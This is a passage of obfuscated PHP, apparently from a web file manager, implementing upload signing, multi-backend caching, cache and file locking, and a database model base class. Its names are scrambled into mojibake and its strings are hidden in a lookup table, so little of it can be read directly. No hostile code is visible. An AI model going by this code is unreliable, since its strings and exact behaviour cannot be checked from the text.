__construct($ÄùÂ»Ö) { parent::__construct($ÄùÂ»Ö); $this->setSignVersion($_SERVER[¬ÏÕ§Áú][260]); } public function uploadFormData($ˆ¾‡à˜…, $¯ôÉ›¸è = 3600) { $Å€Ğî¡ =& $_SERVER[¬ÏÕ§Áú]; $ı­´õÅ® = $Å€Ğî¡[242]; $æøõÂœ± = $Å€Ğî¡[1474]; $¼Š·  = $Å€Ğî¡[274]; $ßÎŒ°À = gmdate($Å€Ğî¡[1475], time() + $¯ôÉ›¸è); $¢Ñ£óŸ = (string) time() . $Å€Ğî¡[84] . (string) (time() + $¯ôÉ›¸è); $Í…¡è”Ê = array($Å€Ğî¡[275] => $ßÎŒ°À, $Å€Ğî¡[278] => array(array($Å€Ğî¡[318] => $ı­´õÅ®), array($Å€Ğî¡[279] => $this->bucket), array($Å€Ğî¡[280], $Å€Ğî¡[281], $Å€Ğî¡[12]), array($Å€Ğî¡[283] => $¼Š· ), array($Å€Ğî¡[1476] => $æøõÂœ±), array($Å€Ğî¡[1477] => $this->accessKey), array($Å€Ğî¡[1478] => $¢Ñ£óŸ))); $Í…¡è”Ê = json_encode($Í…¡è”Ê); $ôöÍ¸Õ = hash_hmac($Å€Ğî¡[1474], $¢Ñ£óŸ, $this->secret); $ë‰Ì‹á = sha1($Í…¡è”Ê); $èëÇòÚ™ = hash_hmac($Å€Ğî¡[1474], $ë‰Ì‹á, $ôöÍ¸Õ); $Û…çğş† = array($Å€Ğî¡[318] => $ı­´õÅ®, $Å€Ğî¡[283] => $¼Š· , $Å€Ğî¡[290] => base64_encode($Í…¡è”Ê), $Å€Ğî¡[1476] => $æøõÂœ±, $Å€Ğî¡[1477] => $this->accessKey, $Å€Ğî¡[1479] => $¢Ñ£óŸ, $Å€Ğî¡[1480] => $èëÇòÚ™, $Å€Ğî¡[219] => $this->getHost()); return $Û…çğş†; } public function fileOutImage($¡´ªûÒ, $›ºÛñÓ‰ = 250) { $„Êş•ë¤ =& $_SERVER[¬ÏÕ§Áú]; if ($this->size($¡´ªûÒ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¡´ªûÒ, $›ºÛñÓ‰); } $„½øË’ = $this->link($¡´ªûÒ); $„½øË’ .= $„Êş•ë¤[1481] . $›ºÛñÓ‰ . $„Êş•ë¤[1482]; $this->fileOutLink($„½øË’); } } goto E‹ÅğÏ˜Ğ‚; a®³äƒô’: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $Ö²òùÒ¶ =& $_SERVER[¬ÏÕ§Áú]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $©î¼­Í = $GLOBALS[$Ö²òùÒ¶[6]][$Ö²òùÒ¶[435]]; $–¹‰Å— = $©î¼­Í[$©î¼­Í[$Ö²òùÒ¶[948]]]; $õ§´×„° = $©î¼­Í[$Ö²òùÒ¶[949]]; switch ($©î¼­Í[$Ö²òùÒ¶[948]]) { case $Ö²òùÒ¶[21]: self::$handle = Model($Ö²òùÒ¶[950]); break; case $Ö²òùÒ¶[951]: self::$handle = new CacheRedis($–¹‰Å—, $õ§´×„°); break; case $Ö²òùÒ¶[952]: self::$handle = new CacheMemcached($–¹‰Å—, $õ§´×„°); break; case $Ö²òùÒ¶[243]: self::$handle = new CacheFile($–¹‰Å—, $õ§´×„°); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ëˆº£˜Å) { if (is_array($Ëˆº£˜Å) || is_object($Ëˆº£˜Å)) { $Ëˆº£˜Å = json_encode($Ëˆº£˜Å); } $Ëˆº£˜Å = rawurlencode($Ëˆº£˜Å); return md5(KOD_SITE_ID . $_SERVER[¬ÏÕ§Áú][11] . $Ëˆº£˜Å); } public static function get($ş±‘…ÅÏ, $ÆÉÍÖç = false) { $à™†ó™Ş = self::key($ş±‘…ÅÏ); $åŠÜÂ¨à = self::init(); if ($ÆÉÍÖç) { return unserialize($åŠÜÂ¨à->get($à™†ó™Ş)); } if (!isset(self::$memoryCache[$à™†ó™Ş])) { $…Áíİå¹ = $åŠÜÂ¨à->get($à™†ó™Ş); self::$memoryCache[$à™†ó™Ş] = unserialize($…Áíİå¹); } return self::$memoryCache[$à™†ó™Ş]; } public static function set($‰§ç…ãã, $Éˆí™™, $µ‰ÌêÙ“ = false) { $ôª¿³Ò =& $_SERVER[¬ÏÕ§Áú]; $ı¨¡¼¡ = self::key($‰§ç…ãã); if (isset(self::$memoryCache[$ı¨¡¼¡]) && self::$memoryCache[$ı¨¡¼¡] === $Éˆí™™) { return !0; } if ($µ‰ÌêÙ“ === 0) { self::$memoryCache[$ı¨¡¼¡] = $Éˆí™™; return !0; } $áÁÕ şğ = self::init(); $ˆ«ºÖ®ö = serialize($Éˆí™™); CacheLock::lock($‰§ç…ãã . $ôª¿³Ò[953]); $ò ÚÎÇ“ = $áÁÕ şğ->set($ı¨¡¼¡, $ˆ«ºÖ®ö, $µ‰ÌêÙ“); self::$memoryCache[$ı¨¡¼¡] = $Éˆí™™; CacheLock::unlock($‰§ç…ãã . $ôª¿³Ò[953]); return $ò ÚÎÇ“; } public static function getCall($Í¢Î±ÑÆ, $ˆ’¹Õö, $×ñÀÂÃõ, $›Ê»¬Éã = array()) { $ûŸ£¼ñ­ =& $_SERVER[¬ÏÕ§Áú]; $î¬ëúƒÅ = self::get($Í¢Î±ÑÆ); if ($î¬ëúƒÅ || $î¬ëúƒÅ === $ûŸ£¼ñ­[12]) { return $î¬ëúƒÅ; } $î¬ëúƒÅ = call_user_func_array($×ñÀÂÃõ, $›Ê»¬Éã); $î¬ëúƒÅ = $î¬ëúƒÅ ? $î¬ëúƒÅ : $ûŸ£¼ñ­[12]; self::set($Í¢Î±ÑÆ, $î¬ëúƒÅ, $ˆ’¹Õö); return $î¬ëúƒÅ; } public static function limitCall($¡›à‡ÜÍ, $ÎÜÑÄ°ì = 15, $¿®åõ…¸ = 30, $ãœ×¡æ = true) { $É¡È©ŠŠ =& $_SERVER[¬ÏÕ§Áú]; static $öÒÄË¦ = array(); if ($ãœ×¡æ) { $¡›à‡ÜÍ = $¡›à‡ÜÍ . $É¡È©ŠŠ[954] . KodUser::id() . $É¡È©ŠŠ[955] . get_client_ip(); } if (isset($öÒÄË¦[$¡›à‡ÜÍ]) && is_array($öÒÄË¦[$¡›à‡ÜÍ])) { return $öÒÄË¦[$¡›à‡ÜÍ][$É¡È©ŠŠ[344]] <= $¿®åõ…¸; } $õØã’ƒâ = self::get($¡›à‡ÜÍ); if (!is_array($õØã’ƒâ) || time() - $õØã’ƒâ[$É¡È©ŠŠ[217]] > $ÎÜÑÄ°ì) { $õØã’ƒâ = array($É¡È©ŠŠ[217] => time(), $É¡È©ŠŠ[344] => 0); } $õØã’ƒâ[$É¡È©ŠŠ[344]]++; self::set($¡›à‡ÜÍ, $õØã’ƒâ, $ÎÜÑÄ°ì); $öÒÄË¦[$¡›à‡ÜÍ] = $õØã’ƒâ; return $õØã’ƒâ[$É¡È©ŠŠ[344]] <= $¿®åõ…¸; } public static function limitRuntime($íİĞİ¢, $×ƒ¬íœ) { $ÊíÚ¸‘Ó = $_SERVER[¬ÏÕ§Áú][956] . $íİĞİ¢; if (isset(self::$runTimeCache[$ÊíÚ¸‘Ó]) || !$×ƒ¬íœ) { return !0; } $ñ…„ÌÙı = intval(self::get($ÊíÚ¸‘Ó)); $ñ…„ÌÙı = !$ñ…„ÌÙı || $ñ…„ÌÙı <= 0 ? 1 : $ñ…„ÌÙı + 1; if ($ñ…„ÌÙı > $×ƒ¬íœ) { return !1; } self::$runTimeCache[$ÊíÚ¸‘Ó] = !0; self::set($ÊíÚ¸‘Ó, $ñ…„ÌÙı, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ÏüŒó—µ => $¯˜œ¶ğ´) { $şè¨Ç‚È = intval(self::get($ÏüŒó—µ)); $şè¨Ç‚È = !$şè¨Ç‚È || $şè¨Ç‚È <= 1 ? 0 : $şè¨Ç‚È - 1; self::set($ÏüŒó—µ, $şè¨Ç‚È, 3600); } self::$runTimeCache = array(); } public static function remove($…ô•øœ¿) { $¨¹â™¼ù = self::key($…ô•øœ¿); unset(self::$memoryCache[$¨¹â™¼ù]); self::clearTimeout(); CacheLock::lock($…ô•øœ¿); $Ô•Ç±§­ = self::init()->remove($¨¹â™¼ù); CacheLock::unlock($…ô•øœ¿); return $Ô•Ç±§­; } public static function removeMemory($§æÕ°Êà) { $Ô²‰Â¡ = self::key($§æÕ°Êà); unset(self::$memoryCache[$Ô²‰Â¡]); } public static function clearMemory($à²¦üâ = false) { if ($à²¦üâ) { $à²¦üâ = self::key($à²¦üâ); unset(self::$memoryCache[$à²¦üâ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¬ÏÕ§Áú][957])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¬ÏÕ§Áú][958])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($»ÍşÆ…, $ëÜéÏ«è) { $‚ÖÚ™ŸÈ =& $_SERVER[¬ÏÕ§Áú]; $this->cachePath = $»ÍşÆ…[$‚ÖÚ™ŸÈ[97]]; $this->prefix = $‚ÖÚ™ŸÈ[959]; $this->cacheTime = $ëÜéÏ«è; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($§™ã¡ä) { $ÛÌˆÙ¦… =& $_SERVER[¬ÏÕ§Áú]; $§™ã¡ä = str_replace(array($ÛÌˆÙ¦…[960], $ÛÌˆÙ¦…[110], $ÛÌˆÙ¦…[86]), $ÛÌˆÙ¦…[961], $§™ã¡ä); return $this->cachePath . $ÛÌˆÙ¦…[962] . $§™ã¡ä . $ÛÌˆÙ¦…[963]; } public function set($ìÀí÷“›, $©ŒåŞ™“, $ô°ä€• = false) { $ô°ä€• = $ô°ä€• ? $ô°ä€• : $this->cacheTime; $¯ŞÍ„íÖ = $this->getFile($ìÀí÷“›); if (file_put_contents($¯ŞÍ„íÖ, $this->prefix . $©ŒåŞ™“, LOCK_EX)) { @touch($¯ŞÍ„íÖ, intval(time() + $ô°ä€•)); clearstatcache(); return !0; } @unlink($¯ŞÍ„íÖ); return !1; } public function get($É ¾£àø) { $İßññâæ = $this->getFile($É ¾£àø); if (file_exists($İßññâæ) && filemtime($İßññâæ) < time()) { @unlink($İßññâæ); return !1; } $Ÿï‰˜”â = @file_get_contents($İßññâæ); return substr($Ÿï‰˜”â, strlen($this->prefix)); } public function remove($®í°ìÎœ) { $×¦å—õœ = $this->getFile($®í°ìÎœ); return @unlink($×¦å—õœ); } public function deleteAll() { $’Õà©¸ë =& $_SERVER[¬ÏÕ§Áú]; $è¶¸×–Ê = scandir($this->cachePath); foreach ($è¶¸×–Ê as $Ï„©•ºŸ) { $±ŸÙ°ÎÁ = $this->cachePath . $Ï„©•ºŸ; if (strpos($±ŸÙ°ÎÁ, $’Õà©¸ë[963]) && strpos($±ŸÙ°ÎÁ, $’Õà©¸ë[964])) { @unlink($±ŸÙ°ÎÁ); } } } public function clearTimeout() { $ºÙî“Ğ¼ =& $_SERVER[¬ÏÕ§Áú]; $èÍ ´½ = scandir($this->cachePath); foreach ($èÍ ´½ as $³ßÌ€òİ) { $ª–ßÕÂÜ = $this->cachePath . $³ßÌ€òİ; if (strpos($ª–ßÕÂÜ, $ºÙî“Ğ¼[963]) && strpos($ª–ßÕÂÜ, $ºÙî“Ğ¼[964]) && filemtime($ª–ßÕÂÜ) < time()) { @unlink($ª–ßÕÂÜ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÜÒãòöĞ =& $_SERVER[¬ÏÕ§Áú]; if (self::$handle) { return self::$handle; } $Ûİ’Äß¸ = $GLOBALS[$ÜÒãòöĞ[6]][$ÜÒãòöĞ[435]]; self::$timeout = $Ûİ’Äß¸[$ÜÒãòöĞ[965]] ? $Ûİ’Äß¸[$ÜÒãòöĞ[965]] : 10; $Šò¾á‡ = _get($GLOBALS[$ÜÒãòöĞ[6]], $ÜÒãòöĞ[966]); $Õ¤àì¹å = $Ûİ’Äß¸[$ÜÒãòöĞ[948]] ? $Ûİ’Äß¸[$ÜÒãòöĞ[948]] : $ÜÒãòöĞ[243]; if ($Õ¤àì¹å == $ÜÒãòöĞ[21] && $Šò¾á‡ == $ÜÒãòöĞ[13]) { $Õ¤àì¹å = $ÜÒãòöĞ[243]; } switch ($Õ¤àì¹å) { case $ÜÒãòöĞ[951]: self::$handle = new CacheLockRedis(); break; case $ÜÒãòöĞ[952]: self::$handle = new CacheLockMemcached(); break; case $ÜÒãòöĞ[21]: self::$handle = new CacheLockDatabase(); break; case $ÜÒãòöĞ[243]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÜÒãòöĞ[967], $ÜÒãòöĞ[968]); } return self::$handle; } private static function key($÷®ªùá·) { return $_SERVER[¬ÏÕ§Áú][969] . Cache::key($÷®ªùá·); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($óòÚŸí = '') { self::$errorMsg = $óòÚŸí; } public static function lockGlobal($›€¤‰õà, $¿Ã˜ŞÓ“) { return self::lock($›€¤‰õà, $¿Ã˜ŞÓ“, !0); } public static function lock($´À²öš‰, $¦ˆ°½©Ê = false, $â‹†Œ„ = false) { $â½©Œ¹¤ =& $_SERVER[¬ÏÕ§Áú]; $®”™À¸‚ = self::init(); $ÑŒó÷Æİ = self::key($´À²öš‰); $¦ˆ°½©Ê = $¦ˆ°½©Ê ? $¦ˆ°½©Ê : self::$timeout; $ÈÏ´£ÈÄ = timeFloat(); if (_get($GLOBALS, $â½©Œ¹¤[970], !1)) { if (!$®”™À¸‚->lock($ÑŒó÷Æİ, 0.2)) { die; } return !0; } $¶™ü­ìƒ = $®”™À¸‚->lock($ÑŒó÷Æİ, $¦ˆ°½©Ê); $ËÙşûÃ­ = timeFloat(); if (!$¶™ü­ìƒ) { $ñÔ™Õº• = "\154\157\x63\153\40\x65\x72\162\x6f\162\73\x6b\145\x79\75{$´À²öš‰}\x3b\x74\151\x6d\145\x3d{$¦ˆ°½©Ê}\x3b" . self::$errorMsg . $â½©Œ¹¤[84] . get_caller_msg(); $ÇÙ†âıï = LNG($â½©Œ¹¤[971]) . "\x28{$¦ˆ°½©Ê}\x73\x29\56" . LNG($â½©Œ¹¤[972]); $ÇÙ†âıï .= $â½©Œ¹¤[973]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÇÙ†âıï = $ÇÙ†âıï . $â½©Œ¹¤[974] . self::$errorMsg; } write_log($â½©Œ¹¤[975] . sprintf($â½©Œ¹¤[976], timeFloat() - $ÈÏ´£ÈÄ) . $â½©Œ¹¤[977] . $ñÔ™Õº• . $â½©Œ¹¤[978] . json_encode(error_get_last()), $â½©Œ¹¤[968]); show_json($ÇÙ†âıï, !1); } if (!$â‹†Œ„) { self::$lockItem[$ÑŒó÷Æİ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¹›ğá£Ø = number_format(timeFloat() - $ËÙşûÃ­, 3); write_log($â½©Œ¹¤[979] . $´À²öš‰ . $â½©Œ¹¤[980] . $¹›ğá£Ø, $â½©Œ¹¤[968]); } return $¶™ü­ìƒ; } public static function lockGet($ÖĞ÷ùÜú) { $ª©·š•¡ = self::key($ÖĞ÷ùÜú); if (self::$lockItem[$ª©·š•¡]) { return self::$lockItem[$ª©·š•¡]; } return self::init()->lockGet($ª©·š•¡); } public static function unlock($ö£ã¬Ôü) { $ù†©Ô¼« =& $_SERVER[¬ÏÕ§Áú]; $ßæİÄ§Œ = self::key($ö£ã¬Ôü); self::$lockItem[$ßæİÄ§Œ] = null; self::init()->unlock($ßæİÄ§Œ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ù†©Ô¼«[981] . $ö£ã¬Ôü, $ù†©Ô¼«[968]); } return; } public static function unlockRuntime() { $ÂğØæöÄ =& $_SERVER[¬ÏÕ§Áú]; $¹Ò§è£¹ = self::init(); $†¸§˜ù™ = !1; foreach (self::$lockItem as $ûÙÌ¹ôâ => $ˆ´ş…Ú) { if (!$ˆ´ş…Ú) { continue; } $¹Ò§è£¹->unlock($ûÙÌ¹ôâ); if (!$†¸§˜ù™) { $†¸§˜ù™ = !0; write_log($ÂğØæöÄ[982] . $ûÙÌ¹ôâ . $ÂğØæöÄ[84] . get_caller_msg(), $ÂğØæöÄ[968]); continue; } write_log($ÂğØæöÄ[982] . $ûÙÌ¹ôâ, $ÂğØæöÄ[968]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ù€÷Ş«Ô = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÂğØæöÄ[983] . $Ù€÷Ş«Ô . $ÂğØæöÄ[984] . ACTION, $ÂğØæöÄ[968]); } } public static function fileLock($—·Ñ¦¸É) { $ç¯ÔÁ‘ =& $_SERVER[¬ÏÕ§Áú]; if (!$GLOBALS[$ç¯ÔÁ‘[985]]) { $GLOBALS[$ç¯ÔÁ‘[985]] = array(); } $GLOBALS[$ç¯ÔÁ‘[985]][$—·Ñ¦¸É] = !1; $Á‘úŸéÄ = fopen(DATA_PATH . $—·Ñ¦¸É . $ç¯ÔÁ‘[986], $ç¯ÔÁ‘[987]); if (!$Á‘úŸéÄ) { return !1; } $GLOBALS[$ç¯ÔÁ‘[985]][$—·Ñ¦¸É] = $Á‘úŸéÄ; if (flock($Á‘úŸéÄ, LOCK_EX)) { return !0; } self::unlock($—·Ñ¦¸É); show_json($ç¯ÔÁ‘[988], !1); return !1; } public static function fileUnlock($³˜€ùÀ) { $û’Å´Ââ =& $_SERVER[¬ÏÕ§Áú]; $×ÂÒä³Ô = $GLOBALS[$û’Å´Ââ[985]][$³˜€ùÀ]; if (!$×ÂÒä³Ô) { return; } $GLOBALS[$û’Å´Ââ[985]][$³˜€ùÀ] = !1; flock($×ÂÒä³Ô, LOCK_UN); fclose($×ÂÒä³Ô); } public static function fileUnlockAll() { $µ¸àı†Õ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($GLOBALS[$µ¸àı†Õ[985]]) || !$GLOBALS[$µ¸àı†Õ[985]]) { return; } foreach ($GLOBALS[$µ¸àı†Õ[985]] as $úéô‰ú‚ => $é«·ÉÙÏ) { if (!$é«·ÉÙÏ) { continue; } $GLOBALS[$µ¸àı†Õ[985]][$úéô‰ú‚] = !1; flock($é«·ÉÙÏ, LOCK_UN); fclose($é«·ÉÙÏ); } $GLOBALS[$µ¸àı†Õ[985]] = array(); } } goto CŞÚ¡¯º©; FÍ®¶›ÂÇ”: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\124\x69\x6d\145", "\164\x69\155\x65", "\x69\156\163\145\x72\164\x2c\x75\x70\x64\x61\164\x65", "\x66\165\x6e\143\164\151\157\x6e"), array("\x63\x72\x65\x61\164\145\x54\151\x6d\145", "\164\x69\x6d\145", "\151\x6e\x73\145\x72\164", "\146\165\156\x63\x74\151\157\x6e")); public function setDataAuto($ŠõŸ„ï©) { $this->dataAuto = $ŠõŸ„ï©; } public function __construct($İŠ­Äøµ = '', $Ñ‹€šÀ = '', $”˜¸Ôõ× = '') { parent::__construct($İŠ­Äøµ, $Ñ‹€šÀ, $”˜¸Ôõ×); } protected $tableMeta = array(); protected function _beforeInsert(&$¯±•Ä‚ô, $àî¡ëáƒ) { $¾Â üı¦ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->checkDataAutoHas($¾Â üı¦[441])) { return; } $this->dataBeforeFilter($¯±•Ä‚ô, $¾Â üı¦[441]); } protected function _beforeUpdate(&$Ö‹„èşÈ, $ÒÔúƒ°) { $—ıÌß†ì =& $_SERVER[¬ÏÕ§Áú]; if (!$this->checkDataAutoHas($—ıÌß†ì[442])) { return; } $this->dataBeforeFilter($Ö‹„èşÈ, $—ıÌß†ì[442]); } protected function _afterSelect(&$•úûãˆè, $ÚÍ‚¥ÙÂ) { if (!is_array($•úûãˆè)) { return; } if (!$this->checkDataAutoHas($_SERVER[¬ÏÕ§Áú][443])) { return; } foreach ($•úûãˆè as &$¸Â‡ûÆ·) { $this->dataAfterFilter($¸Â‡ûÆ·); } unset($¸Â‡ûÆ·); } protected function _afterFind(&$ÉšàüÎÔ, $†¢Ä‡É) { if (!is_array($ÉšàüÎÔ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¬ÏÕ§Áú][443])) { return; } $this->dataAfterFilter($ÉšàüÎÔ); } public static function textEncode($ìŞù—ø—) { if (!$ìŞù—ø—) { return $ìŞù—ø—; } $øÙª„¥ğ = json_encode($ìŞù—ø—); $øÙª„¥ğ = preg_replace_callback($_SERVER[¬ÏÕ§Áú][444], function ($È£×˜ú) { return addslashes($È£×˜ú[0]); }, $øÙª„¥ğ); return json_decode($øÙª„¥ğ); } public static function textDecode($šÙë˜¢) { $ÆÎ¤¤˜ì =& $_SERVER[¬ÏÕ§Áú]; $ï›‰‘Ÿµ = json_encode($šÙë˜¢); $ï›‰‘Ÿµ = preg_replace_callback($ÆÎ¤¤˜ì[445], function ($Ç¬àèÉË) { return $_SERVER[¬ÏÕ§Áú][110]; }, $ï›‰‘Ÿµ); return json_decode($ï›‰‘Ÿµ); } public function setAutoIncrement($Ï««ƒÅ) { $šîÄ¢Ä = array($this->getPk() => $Ï««ƒÅ); $»†ãöË = $this->data($šîÄ¢Ä)->add(); if ($»†ãöË) { $this->delete($»†ãöË); } } public function getAutoIncrement() { $ªµŠÚº = $this->getTableName(); $¿¾÷±áô = $this->max($this->getPk()); $„ ¸óØõ = $this->query("\163\150\157\x77\x20\x74\x61\142\154\x65\40\163\x74\x61\164\x75\x73\40\x77\x68\x65\162\145\x20\x4e\141\155\x65\x3d\47{$ªµŠÚº}\x27"); $¸ÊıÇ¡ö = $„ ¸óØõ[0][$_SERVER[¬ÏÕ§Áú][446]]; $·Çƒ·á‘ = max($¿¾÷±áô, $¸ÊıÇ¡ö); return $·Çƒ·á‘; } protected function _callBefore($ÊÈ—³•, $¾à¹¼…Ñ) { return $this->cacheCallCheck($ÊÈ—³•, $¾à¹¼…Ñ, !1); } protected function _callAfter($Ôîªçµª, $ğ©¬Ã˜) { return $this->cacheCallCheck($Ôîªçµª, $ğ©¬Ã˜, !0); } protected function cacheFunctionAlias($àÔ´‘Ú) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($©¿ææ‚, $›¿„´Ï, $©í†ş×Û = false) { $î†Ø›„Û =& $_SERVER[¬ÏÕ§Áú]; $Š¸ÓÊíş = $this->cacheFunctionAlias($›¿„´Ï); if (!$Š¸ÓÊíş) { return; } foreach ($Š¸ÓÊíş as $ÚñŒ·ä => $ÓÈ‘ÕßŸ) { $Ù‡“†â˜ = $ÓÈ‘ÕßŸ[0]; $ªâİ°ï½ = explode($î†Ø›„Û[50], $ÓÈ‘ÕßŸ[1]); $–Ú£¸’ = isset($ÓÈ‘ÕßŸ[2]) ? $ÓÈ‘ÕßŸ[2] : $î†Ø›„Û[12]; if ($©¿ææ‚ == $ÚñŒ·ä) { return $this->cacheFunctionGet($ÚñŒ·ä, $Ù‡“†â˜, $–Ú£¸’); } if ($©í†ş×Û && in_array($©¿ææ‚, $ªâİ°ï½)) { $this->cacheFunctionClear($ÚñŒ·ä, $Ù‡“†â˜, $–Ú£¸’); } } } public function cacheFunctionGet($›”Ö—ç¿, $íÒÛ€îİ, $§Œá’Ü = '') { $¸«Ò­· = $this->cacheKeyMake($›”Ö—ç¿, $íÒÛ€îİ, $§Œá’Ü); $Ë˜½ÍÄ = Cache::get($¸«Ò­·); if (!is_array($Ë˜½ÍÄ)) { $Ë˜½ÍÄ = call_user_func_array(array($this, $›”Ö—ç¿), array($íÒÛ€îİ, !0)); Cache::set($¸«Ò­·, $Ë˜½ÍÄ); } return $Ë˜½ÍÄ; } public function cacheFunctionClear($¤®ÑÔÑ, $à“ËÁ‘—, $Ôùœñîä = '') { $û§ù‘ÒÀ = $à“ËÁ‘—; if (!is_array($à“ËÁ‘—)) { $û§ù‘ÒÀ = array($à“ËÁ‘—); } foreach ($û§ù‘ÒÀ as $ˆ›“°‡) { $Ü¿àÔ³Ÿ = $this->cacheKeyMake($¤®ÑÔÑ, $ˆ›“°‡, $Ôùœñîä); Cache::remove($Ü¿àÔ³Ÿ); } } public function cacheKeyMake($ëíîä§, $äŞ´šï¾, $·‹õ„š¾) { $áÙ¹Ä“ı =& $_SERVER[¬ÏÕ§Áú]; if ($·‹õ„š¾) { $äŞ´šï¾ = $äŞ´šï¾ . $áÙ¹Ä“ı[447] . $·‹õ„š¾; } return get_class($this) . $áÙ¹Ä“ı[11] . $ëíîä§ . $áÙ¹Ä“ı[448] . $äŞ´šï¾; } protected function selectPageReset() { $ÌÊåĞº¿ =& $_SERVER[¬ÏÕ§Áú]; if (isset($GLOBALS[$ÌÊåĞº¿[449]])) { return; } $GLOBALS[$ÌÊåĞº¿[449]] = isset($GLOBALS[$ÌÊåĞº¿[7]][$ÌÊåĞº¿[450]]) ? $GLOBALS[$ÌÊåĞº¿[7]][$ÌÊåĞº¿[450]] : !1; $GLOBALS[$ÌÊåĞº¿[451]] = isset($GLOBALS[$ÌÊåĞº¿[7]][$ÌÊåĞº¿[439]]) ? $GLOBALS[$ÌÊåĞº¿[7]][$ÌÊåĞº¿[439]] : !1; $GLOBALS[$ÌÊåĞº¿[7]][$ÌÊåĞº¿[450]] = !1; $GLOBALS[$ÌÊåĞº¿[7]][$ÌÊåĞº¿[439]] = !1; } protected function selectPageRestore() { $±ø¢¯•Ù =& $_SERVER[¬ÏÕ§Áú]; if (!isset($GLOBALS[$±ø¢¯•Ù[449]])) { return; } $GLOBALS[$±ø¢¯•Ù[7]][$±ø¢¯•Ù[450]] = $GLOBALS[$±ø¢¯•Ù[449]]; $GLOBALS[$±ø¢¯•Ù[7]][$±ø¢¯•Ù[439]] = $GLOBALS[$±ø¢¯•Ù[451]]; if ($GLOBALS[$±ø¢¯•Ù[7]][$±ø¢¯•Ù[450]] === !1) { unset($GLOBALS[$±ø¢¯•Ù[7]][$±ø¢¯•Ù[450]]); } if ($GLOBALS[$±ø¢¯•Ù[7]][$±ø¢¯•Ù[439]] === !1) { unset($GLOBALS[$±ø¢¯•Ù[7]][$±ø¢¯•Ù[439]]); } unset($GLOBALS[$±ø¢¯•Ù[449]]); unset($GLOBALS[$±ø¢¯•Ù[451]]); } protected function selectPage($³œÁÛ½ = 200, $İ®®ƒƒ = 1) { $ì¶Í°ÉÛ =& $_SERVER[¬ÏÕ§Áú]; global $in; $éÂôÄÄ  = $this->optionsValue(); $¡¶ÕÓƒ = 50000; $³œÁÛ½ = isset($in[$ì¶Í°ÉÛ[450]]) && $in[$ì¶Í°ÉÛ[450]] ? $in[$ì¶Í°ÉÛ[450]] : $³œÁÛ½; if ($³œÁÛ½ === -1) { $in[$ì¶Í°ÉÛ[450]] = !1; $¡¶ÕÓƒ = 100000000; $³œÁÛ½ = $¡¶ÕÓƒ; } $Êšì«Æå = $éÂôÄÄ ; $Êšì«Æå[$ì¶Í°ÉÛ[452]] = array(); $³œÁÛ½ = intval($³œÁÛ½); $³œÁÛ½ = $³œÁÛ½ <= 5 ? 5 : ($³œÁÛ½ >= $¡¶ÕÓƒ ? $¡¶ÕÓƒ : $³œÁÛ½); $İ®®ƒƒ = intval(isset($in[$ì¶Í°ÉÛ[439]]) && $in[$ì¶Í°ÉÛ[439]] ? $in[$ì¶Í°ÉÛ[439]] : $İ®®ƒƒ); $İ®®ƒƒ = $İ®®ƒƒ <= 1 ? 1 : $İ®®ƒƒ; $¶ù Ú² = array(); $Š¶ä®æá = 1; if ($İ®®ƒƒ == 1 && $Š¶ä®æá) { $this->optionsValue($éÂôÄÄ ); $¶ù Ú² = $this->page($İ®®ƒƒ, $³œÁÛ½)->select(); $ŸØçÄÀ = is_array($¶ù Ú²) ? count($¶ù Ú²) : 0; if ($ŸØçÄÀ < $³œÁÛ½) { $Îê’¡¨ğ = 1; } else { $this->optionsValue($Êšì«Æå); $ŸØçÄÀ = intval($this->count()); $Îê’¡¨ğ = ceil($ŸØçÄÀ / $³œÁÛ½); } } else { $this->optionsValue($Êšì«Æå); $ŸØçÄÀ = intval($this->count()); $Îê’¡¨ğ = ceil($ŸØçÄÀ / $³œÁÛ½); $İ®®ƒƒ = $İ®®ƒƒ >= $Îê’¡¨ğ ? $Îê’¡¨ğ : $İ®®ƒƒ; $this->optionsValue($éÂôÄÄ ); $¶ù Ú² = $this->page($İ®®ƒƒ, $³œÁÛ½)->select(); } if (!is_array($¶ù Ú²)) { $¶ù Ú² = array(); } if ($Îê’¡¨ğ == 1) { $ŸØçÄÀ = count($¶ù Ú²); } $¥Ç¢©›‰ = array($ì¶Í°ÉÛ[453] => array($ì¶Í°ÉÛ[454] => $ŸØçÄÀ, $ì¶Í°ÉÛ[450] => $³œÁÛ½, $ì¶Í°ÉÛ[439] => $İ®®ƒƒ, $ì¶Í°ÉÛ[455] => $Îê’¡¨ğ), $ì¶Í°ÉÛ[456] => $¶ù Ú²); return $¥Ç¢©›‰; } protected function checkLength($™šİÄàå, $áîë· = 0, $ô‘õ“˜ = '') { $àåÑœû =& $_SERVER[¬ÏÕ§Áú]; $áîë· = $áîë· ? $áîë· : 65536; if (!$™šİÄàå || strlen($™šİÄàå) < $áîë·) { return; } $ô‘õ“˜ = $ô‘õ“˜ ? $ô‘õ“˜ . 